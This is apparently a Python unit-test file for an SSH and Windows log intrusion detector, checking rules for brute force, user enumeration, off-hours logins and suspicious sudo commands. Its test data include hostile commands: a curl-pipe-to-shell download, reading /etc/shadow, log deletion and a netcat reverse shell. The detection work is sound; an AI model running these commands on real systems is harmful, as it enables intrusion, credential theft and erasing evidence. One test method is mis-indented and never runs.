import unittest
from datetime import datetime, timedelta

from sshdetect import Config, Detector, parse_line, parse_windows_xml

BASE = datetime(2026, 9, 14, 10, 0, 0)


def fail_line(dt, user="root", ip="1.2.3.4", invalid=False):
    return f"{dt:%b} {dt.day:2d} {dt:%H:%M:%S} h sshd[1]: Failed password for {'invalid user ' if invalid else ''}{user} from {ip} port 22 ssh2"


def ok_line(dt, user="alice", ip="1.2.3.4"):
    return f"{dt:%b} {dt.day:2d} {dt:%H:%M:%S} h sshd[1]: Accepted password for {user} from {ip} port 22 ssh2"


def sudo_line(dt, cmd, user="alice"):
    return f"{dt:%b} {dt.day:2d} {dt:%H:%M:%S} h sudo:   {user} : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND={cmd}"


def feed(lines, cfg=None):
    det = Detector(cfg or Config())
    alerts = []
    for l in lines:
        ev = parse_line(l, 2026)
        if ev:
            alerts += det.process(ev)
    return alerts


class TestParser(unittest.TestCase):
    def test_failed(self):
        ev = parse_line(fail_line(BASE, "bob", "9.9.9.9", invalid=True), 2026)
        self.assertEqual((ev.kind, ev.user, ev.ip), ("failed", "bob", "9.9.9.9"))

    def test_accepted(self):
        ev = parse_line(ok_line(BASE), 2026)
        self.assertEqual((ev.kind, ev.user), ("accepted", "alice"))

    def test_sudo(self):
        ev = parse_line(sudo_line(BASE, "/bin/ls"), 2026)
        self.assertEqual((ev.kind, ev.cmd), ("sudo", "/bin/ls"))

    def test_garbage_ignored(self):
        self.assertIsNone(parse_line("not a log line", 2026))
        self.assertIsNone(parse_line("Sep 14 10:00:00 h cron[1]: job done", 2026))

    def test_windows_security_event_normalized(self):
        xml = """<Event><System><Provider Name="Microsoft-Windows-Security-Auditing" />
          <EventID>4625</EventID><TimeCreated SystemTime="2026-09-14T10:00:00Z" />
          <Computer>win01</Computer></System><EventData>
          <Data Name="TargetUserName">alice</Data><Data Name="IpAddress">1.2.3.4</Data>
          </EventData></Event>"""
        [event] = parse_windows_xml(xml)
        self.assertEqual((event.source, event.kind, event.user, event.ip, event.host),
                         ("windows", "failed", "alice", "1.2.3.4", "win01"))

    def test_invalid_windows_xml_ignored(self):
        self.assertEqual(parse_windows_xml("<Event>"), [])

        def test_windows_xml_batch_normalizes_each_record(self):
                xml = """<Events>
                    <Event><System><EventID>4625</EventID><TimeCreated SystemTime="2026-09-14T10:00:00Z" />
                    <Computer>win01</Computer></System><EventData><Data Name="TargetUserName">alice</Data></EventData></Event>
                    <Event><System><EventID>4624</EventID><TimeCreated SystemTime="2026-09-14T10:00:01Z" />
                    <Computer>win01</Computer></System><EventData><Data Name="TargetUserName">alice</Data></EventData></Event>
                    </Events>"""
                events = parse_windows_xml(xml)
                self.assertEqual([event.kind for event in events], ["failed", "accepted"])


class TestBruteForce(unittest.TestCase):
    def test_fires_at_threshold(self):
        alerts = feed([fail_line(BASE + timedelta(seconds=i)) for i in range(5)])
        self.assertEqual([a.rule for a in alerts], ["brute_force"])

    def test_below_threshold(self):
        self.assertEqual(feed([fail_line(BASE + timedelta(seconds=i)) for i in range(4)]), [])

    def test_slow_attempts_do_not_fire(self):
        self.assertEqual(feed([fail_line(BASE + timedelta(seconds=30 * i)) for i in range(10)]), [])

    def test_cooldown_dedupes(self):
        alerts = feed([fail_line(BASE + timedelta(seconds=i)) for i in range(40)])
        self.assertEqual(len(alerts), 1)

    def test_separate_ips_tracked_separately(self):
        lines = [fail_line(BASE + timedelta(seconds=i), ip=f"1.1.1.{i % 5}") for i in range(20)]
        self.assertEqual(feed(lines), [])


class TestSuccessAfterFailures(unittest.TestCase):
    def test_compromise_pattern(self):
        lines = [fail_line(BASE + timedelta(seconds=i)) for i in range(6)] + [ok_line(BASE + timedelta(seconds=30))]
        rules = {a.rule for a in feed(lines)}
        self.assertIn("success_after_failures", rules)

    def test_typos_do_not_fire(self):
        lines = [fail_line(BASE), fail_line(BASE + timedelta(seconds=5)), ok_line(BASE + timedelta(seconds=10))]
        self.assertEqual(feed(lines), [])

    def test_suspicious_command_completes_attack_chain(self):
        lines = [fail_line(BASE + timedelta(seconds=i), user="alice") for i in range(6)]
        lines += [ok_line(BASE + timedelta(seconds=30), user="alice"),
                  sudo_line(BASE + timedelta(seconds=40), "/usr/bin/cat /etc/shadow", user="alice")]
        self.assertIn("attack_chain", {alert.rule for alert in feed(lines)})


class TestEnumeration(unittest.TestCase):
    def test_many_usernames(self):
        users = ["admin", "test", "oracle", "git"]
        lines = [fail_line(BASE + timedelta(seconds=20 * i), user=u) for i, u in enumerate(users)]
        self.assertEqual([a.rule for a in feed(lines)], ["user_enumeration"])


class TestOffHours(unittest.TestCase):
    NIGHT = datetime(2026, 9, 14, 3, 0, 0)

    def test_night_login_alerts(self):
        self.assertEqual([a.rule for a in feed([ok_line(self.NIGHT)])], ["off_hours_login"])

    def test_day_login_ok(self):
        self.assertEqual(feed([ok_line(BASE)]), [])

    def test_service_account_allowlist(self):
        cfg = Config(offhours_ignore_users=frozenset({"backup"}))
        self.assertEqual(feed([ok_line(self.NIGHT, user="backup")], cfg), [])


class TestCommands(unittest.TestCase):
    def test_malicious(self):
        bad = ["/bin/bash -c 'curl -s http://x/y.sh | sh'", "/usr/bin/cat /etc/shadow",
               "/usr/sbin/useradd -m evil", "/bin/rm -f /var/log/auth.log", "/usr/bin/nc 1.2.3.4 4444 -e /bin/sh"]
        for cmd in bad:
            with self.subTest(cmd=cmd):
                self.assertEqual([a.rule for a in feed([sudo_line(BASE, cmd)])], ["suspicious_command"])

    def test_benign(self):
        for cmd in ["/usr/bin/apt update", "/usr/bin/systemctl restart nginx", "/usr/bin/cat /var/log/auth.log"]:
            with self.subTest(cmd=cmd):
                self.assertEqual(feed([sudo_line(BASE, cmd)]), [])


if __name__ == "__main__":
    unittest.main()
